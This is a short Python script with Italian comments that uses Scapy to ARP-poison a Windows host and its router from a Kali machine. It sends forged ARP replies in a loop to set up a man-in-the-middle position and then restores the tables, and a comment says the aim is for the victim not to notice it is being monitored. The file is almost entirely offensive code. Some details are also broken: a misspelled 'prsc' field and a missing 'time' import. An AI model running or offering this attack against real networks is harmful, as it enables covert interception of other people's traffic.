# air spoofing

from scapy.all import *

# funzione avvelenamento
def vittima_spoof():
    risposta_arp = ARP()
    print(risposta_arp.show()) # giusto per vedere dati

    # modifico dei dati
    # queste informazioni le invieremo da Kali Linux fingendo di essere il Router
    # il campo psrc funge di essere l'IP del router invece di Kali
    risposta_arp.op = 2
    risposta_arp.pdst = "192.168.1.163" # IP di windows
    risposta_arp.hwdst = "00:90:8b:1f:53:11" # MAC di Windows
    risposta_arp.hwsrc = "00:90:8b:11:45:6f" # MAC di Kali
    risposta_arp.prsc = "192.168.1.1" # valore falso Indirizzo IP di KALI

    # inviamo il pacchetto
    try:
        send(risposta_arp)
        print(risposta_arp.show())
    except Exception as e:
        print(f"Errore: {e}")

# funzione avvelenamento router
def router_spoof():
    risposta_arp = ARP()
    risposta_arp.op = 2
    risposta_arp.pdst = "192.168.1.1" # IP del router
    risposta_arp.hwdst = "23:50:00:0a:6d:c0" # MAC del router
    risposta_arp.hwsrc = "00:90:8b:11:45:6f" # MAC di Kali
    risposta_arp.prsc = "192.168.1.163" # indirizzo fake

    # inviamo il pacchetto
    try:
        send(risposta_arp)
        print(risposta_arp.show())
    except Exception as e:
        print(f"Errore: {e}")

# lanciamo attacco con un ciclo
try:
    while True:
        vittima_spoof() # spooffo vittima
        router_spoof() # spoofo router
        time.sleep(2) # spooffo entrambi ogni 2 secondi
except KeyboardInterrupt as e:
        print("Uscita")

# oer forwardare il traffico e non fare accorgere vittima di essere monitorata
def tolgo_il_disturbo():
    # ripristiniamo la tabella del router
    risposta_arp = ARP()
    risposta_arp.op = 2
    risposta_arp.pdst = "192.168.1.1"
    risposta_arp.hwdst = "23:50:00:0a:6d:c0"
    risposta_arp.hwsrc = "00:90:8b:1f:53:11"
    risposta_arp.psrc = "192.168.1.163"
    send(risposta_arp)

    # Windows
    risposta_arp = ARP()
    risposta_arp.op = 2
    risposta_arp.pdst = "192.168.1.163"
    risposta_arp.hwdst = "00:90:8b:1f:53:11"
    risposta_arp.hwsrc = "23:50:00:0a:6d:c0"
    risposta_arp.psrc = "192.168.1.1"
    send(risposta_arp)

tolgo_il_disturbo()
